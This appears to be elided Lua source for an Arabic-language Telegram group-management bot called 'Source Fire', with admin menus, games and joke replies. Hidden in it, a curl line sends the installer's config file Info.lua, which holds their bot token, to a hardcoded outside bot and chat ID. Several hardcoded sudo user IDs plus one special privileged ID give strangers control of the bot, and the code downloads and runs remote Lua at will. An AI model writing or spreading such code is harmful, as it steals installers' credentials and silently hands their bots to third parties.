...
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺ :\na⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺\n\27[0;33;49m')
...
io.write('\27[1;31m ⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
token = sudos.token 
--- start functions ⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MADISON111110/FIRE/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1208165035,1973954899,1859656976,1983629789}   
...
if tonumber(user_id) == tonumber(1915312384) then  
var = true
...
local UserName = (data.username_ or "SO_FIR")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼𝐂𝐇 𝐅𝐈𝐑𝐄 ✰")  
...
if not DevSoFi(msg) then
local Text = [[
↯ سعر التنصيب علي سورس فاير ↯
سعر التنصيب العادي 20جنيه فقط
⇈⇊ للتواصل اتبع الازرار بالاسفل ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المـبـرمـج مـاديـسـون', url="t.me/AAHMEED11"}},
{{text = 'بــوت تواصـل مـاديـسـون',url="t.me/E_H_M_BOT"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المبرمج ماديسون', url="t.me/AAHMEED11"}},
{{text = 'بوت تواصل ماديسون',url="t.me/E_H_M_BOT"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard.inline_keyboard = {
{{text = '╞. 𝐒𝐨𝐮𝐫𝐜𝐞 𝐀𝐥𝐟𝐚 .╡', url="t.me/so_alfaa"},{text = 'ㅕ 𝐒𝐨𝐮𝐫𝐜𝐞 𝐅𝐢𝐫𝐞 ㅑ', url="t.me/SO_FIR"}},
...
if text == 'نينينييننينينينينيين' then
local Text = 'قسم مطورين السورس لدخول الي حسابتهم'
local Key = {
{'⇣•-•-•-•⟮قـناه الـبرمجه⟯•-•-•-•⇣'},
{'المبرمج طه','المبرمج اسلام ✰. '},
{'المبرمج اكسسلفر'},
{'قناة السورس','التواصل'},
{'العوده ➷'},
}
...
{'اوامـر الاذاعـه','اوامـر الـجـلـب'},
{'الغاء'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
...
local Text = ' ☽ تم ارسال الملصق من ⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺\n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/MADISON111110/FIRE/main/DRAGON.lua')
...
if text == 'الاحصـائيات' and DevSoFi(msg) then 
local Text = 'مرحبا بك عزيزي في قسم الاحصائيات 🌚❤️.'
local Key = {
{'الاحصائيات'},
{'الجروبات','المشتركين'},
{'الثانوين','المطورين'},
...
if text == 'اوامـر الـجـلـب' and DevSoFi(msg) then 
local Text = 'مـرحـبــا بــك في قسـم الجلـب🌚❤️'
local Key = {
...
send(msg.chat_id_, msg.id_,' ☽ اصدار سورس فاير{ 3x☆}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مبرمج السورس ⚙', url="t.me/AAHMEED11"}}, 
{{text = '`ᴛᴡᴀѕʟ sᴏᴜʀᴄᴇ´', url="t.me/E_H_M_BOT"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == '⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس فاير ادخل وتابع الجديد](t.me/SO_FIR)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/SO_FIR)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناة السورس', url="t.me/SO_FIR"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
المبرمج ماديسون لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
if text == 'اسلام مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
المبرمج اسلام لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "فاير")
...
send(msg.chat_id_,0," ☽ الـعـضو  : {["..data.first_name_.."](T.ME/SO_FIR)}\n ☽ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
local curl = 'curl "'..'https://api.telegram.org/bot1714366542:AAHo7wOqc8bnuOT_h_dkRu7dcrHHqkhgpXY/sendDocument'..'" -F "chat_id='.. 1859656976 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_,0, " ☽ عذرا  ⇇{["..data.first_name_.."](T.ME/SO_FIR)}\n ☽ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
 ─────── ☽ ───────
 ...
 ☽ خلفيات ⤌ لعرض الميزه
▱▰▱▰▱▰▱▰▱▰▱▰▱▰
𓆩 𝗖𝗛 - [ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐅𝐈𝐑𝐄 ✰](t.me/SO_FIR)𓆪
▱▰▱▰▱▰▱▰▱▰▱▰▱▰
]]
keyboard = {}  
keyboard.inline_keyboard = { 
...
local Text = [[
 𖠪 اهلا بك في سورس فاير الجمدان 𖠪
...
if text == 'ماديسون' or text == 'المبرمج ماديسون' or text == 'احمد' then
local Text = [[
المبرمج ماديسون لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓
]]
...
if text == 'اسلام' or text == 'المبرمج اسلام' or text == 'eslam' then
local Text = [[
المبرمج اسلام لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓
]]
...
if text == 'قناة السورس' or text == 'قناه السورس' or text == 'قناة البرمجه' or text == 'قناه البرمجه' then
local Text = [[
من أحسن السورسات على التليجرام سورس فاير
...
if text == '⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺' or text == '' or text == '' or text == '' then
local Text = [[
من أحسن السورسات على التليجرام سورس فاير
 بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
...
{{text = '📖رواية "أرض زيكولا"',url="https://t.me/SO_FIR"}},
{{text = '📖موسوعة الظلام رعب وما شابه ذلك', url="https://t.me/barfrends/263376"}},
{{text = '📖رواية "الشفق الجزء الأول"', url="https://t.me/SO_FIR"}},
{{text = '📖رواية "المخلوق', url="https://t.me/SO_FIR"}},
{{text = '📖رواية "بعد النسيان"', url="https://t.me/t.me/SO_FIR"}},
{{text = '📖كتاب في حضرة الجن', url="https://t.me/https://t.me/t.me/SO_FIR"}},
{{text = '📖رواية "واختفى كل شئ"', url="https://t.me/t.me/SO_FIR"}},
{{text = '📖رواية "نيلوفر أسود"', url="https://t.me/t.me/SO_FIR"}},
{{text = '📖رواية"جثة في الفندق"', url="https://t.me/t.me/SO_FIR"}},
{{text = '📖رواية "في القطار السريع"', url="https://t.me/t.me/SO_FIR"}},
...
local Text = [[
مطورين ومبرمجين سورس فاير اتبع الازرار للتواصل معهم ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐃𝐞𝐯 𝐌𝐚𝐝𝐢𝐬𝐨𝐧 ✰.', url="t.me/AAHMEED11"}},
...
حمايه↤سرعه↤دقه↤وامان
 قناه السورس ⇈⇊
[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝙵𝙸𝚁𝙴](http://t.me/SO_FIR)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝐂𝐇 𝐅𝐈𝐑𝐄 ✰', url="t.me/SO_FIR"}}, 
...
local Text = [[  
↯ اهلا في قائمه الالعاب المتطوره سورس فاير ↯
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[معاك مطور البوت اهو ياروحي ⇈⇊](t.me/SO_FIR)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/MADISON111110/FIRE/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ☽ اهلا بك في متجر ملفات فاير\n ☽ ملفات السورس ⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺\n ☽ علامة تعني { ✔️ } ملف مفعل\n ☽ علامة تعني { ✖ } ملف معطل\n ☽ قناة سورس فاير⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺\n".." ☽ [اضغط هنا لدخول](t.me/SO_FIR) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/MADISON111110/FIRE/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ☽ عذرا الملف لايدعم سورس فاير\n") 
end
return false
end
...
if text == ("مسح قائمه فاير") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ☽ تم مسح قائمه فاير')
return false
end

if text == 'قائمه فاير' and Sudo(msg) then
...
if text == ("رفع فاير") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع فاير@(.*)$") and Sudo(msg) then
local username = text:match("^رفع فاير@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع فاير(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع فاير(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل فاير") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل فاير@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل فاير@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل فاير(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل فاير(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if #list == 0 then
t = " ☽ لا يوجد مايا خليفه في هذا الجروب البائس"
end
send(msg.chat_id_, msg.id_, t)
end
---------
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ☽ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'SO_FIR')..')'
...
' }\n'..' ☽  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ☽  الرفع  ⇇{ '..setadd..
' }\n'..' ☽  الحظر  ⇇{ '..banm..' }\n\n ☽ ═───═❲[𝐂𝐇 𝐅𝐈𝐑𝐄 ✰](t.me/SO_FIR)❳═───═ ☽ \n ☽ قناة سورس فاير⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺\n [ ❲[𝐂𝐇 𝐅𝐈𝐑𝐄 ✰](t.me/SO_FIR)❳](t.me/SO_FIR) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺\nاضغط علي الاسم ليتم نسخه\n⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺ٴ\n ☽ ❲[𝐂𝐇 𝐅𝐈𝐑𝐄 ✰](t.me/SO_FIR)❳ ☽ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'فاير').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'فاير')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
end --الكود حصري سورس فايريعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'فاير').." غادر" or text == 'غادر' then  
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري نور عنيا🥺🤍](t.me/SO_FIR)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري الثاني حته مني 😍💚](t.me/SO_FIR)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور بس الصغنن 🌝💘](t.me/SO_FIR)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[نت المالك هن يعني حاجه فوق فوق راسي 😂♥](t.me/SO_FIR)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه??🤦‍♂️](t.me/SO_FIR)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/SO_FIR)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/SO_FIR)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/SO_FIR)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت مميز ابن ناس 😊 ](t.me/SO_FIR)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ عضو قميل 🌝💘 ](t.me/SO_FIR)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نعم الله عليك..🌚❤️](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..😒♥️](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[العفو ياروحي..🌚❤️](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..🌚♥️](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[موت بعيد م ناقصين مصايب😑😂](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[جتك اوهه م سامع ولا ايي😹👻](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[فرح خالتك قريب😹💋💃🏻](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[حضرلك الخير يارب..🙂](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[لف ورجع تانى مشحوار 😂🚶‍♂👻](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[يوه خضتني ياسمك اي..🥺💔](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اوه ياه..🌝😂](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[امك اسمها احلام..😹😹](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[كفيه شقط سيب حاجه لغيرك ❤️😂](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝❤️](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خلصتت روحكك يبعيد😹💔](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[بتفكر في اي..🤔](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[وانا كمان بعشقك يا روحي 💋🥰](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[محات حياتي يروحي..🌚💔](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[القمر ده شبهك..🙂♥️](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[هلا بيك ياروحي..💛](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ بنهش كتاكيت احنا هنا ولا اي..🐣😹](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[دايما ياحبيبي..🌚💜](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه فاير](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف..🥺💔](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الخير يعمري..🌚❤️](t.me/SO_FIR)')
return false
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص..😂😜](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق..🥰❤️](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام..🌚🖤](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال..😹](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اه اي يا قدع عيب 😹💔](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عيب ياوسخ..🙄💔](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نعم يا مطوري..🥺💔](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح..😹👻](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح..😹👻](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اعدل وشك ونت بتكلمني 😒](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[صح النوم..😂](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[صباح العسل 🍯🙂](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ده نورك ي قلبي..🙂💛](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ع فين لوين رايح وسايبنى🥺💔](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..🥺❤️](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نورك يا قلبي..🌚❤️](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه..😹💥](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اهدا يوحش ميصحش كدا..😂](t.me/SO_FIR)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚❤️](t.me/SO_FIR)')
return false
end
end
end
...
if Text == '/help30' then
local Text = 'لتجربه العلبه عليك ان تكتب البات في الشات 𖠪'
...
if Text == '/help31' then
local Text = 'لتجربه العلبه عليك ان تكتب المختلف في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help32' then
...
if Text == '/help33' then
local Text = 'لتجربه العلبه عليك ان تكتب الاسرع في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help34' then
local Text = 'لتجربه العلبه عليك ان تكتب الحزوه في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help35' then
local Text = 'لتجربه العلبه عليك ان تكتب امثله في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help36' then
local Text = 'لتجربه العلبه عليك ان تكتب مريم في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help37' then
local Text = 'لتجربه العلبه عليك ان تكتب الرياضيات في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help38' then
local Text = 'لتجربه العلبه عليك ان تكتب السمايلات في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help39' then
local Text = 'لتجربه العلبه عليك ان تكتب العكس في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help40' then
local Text = 'لتجربه العلبه عليك ان تكتب الانكليزي في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help41' then
local Text = 'لتجربه العلبه عليك ان تكتب المعاني في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help42' then
local Text = 'لتجربه العلبه عليك ان تكتب عقاب في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help47' then
local Text = 'لتجربه العلبه عليك ان تكتب كشف الكذب في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/sofi' then
...
if Text == '/Xcvb' then
local Text = 'لتجربه العلبه عليك ان تكتب حروف بالصور في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/klpou6' then
local Text = 'لو عايز يوزر ليك اكتب اصنع واستخرج يوزرك 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/hakwl' then
local Text = 'لتجربه العلبه عليك ان تكتب اسالني في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/wyauuu' then
local Text = 'لتجربه العلبه عليك ان تكتب اختبار الذكاء في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/whklpp' then
local Text = 'لتجربه العلبه عليك ان تكتب مستقبلي في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/uwujjh' then
local Text = 'لتجربه العلبه عليك ان تكتب الابراج في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/ghkk' then
local Text = 'لتجربه العلبه عليك ان تكتب تويت في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help13' then
local Text = 'لتجربه العلبه عليك ان تكتب انصحني في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help14' then
local Text = 'لتجربه العلبه عليك ان تكتب الصراحه في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help15' then
local Text = 'لتجربه العلبه عليك ان تكتب رزله في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help16' then
local Text = 'لتجربه العلبه عليك ان تكتب بتكره دا في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help17' then
local Text = 'للاستماع للاغاني عليك ان تكتب غنيلي في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help18' then
local Text = 'لتجربه العلبه عليك ان تكتب نسبه جمالي في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help19' then
local Text = 'لتجربه العلبه عليك ان تكتب كتبات في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help20' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help21' then
local Text = 'لتجربه العلبه عليك ان تكتب حروف في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help22' then
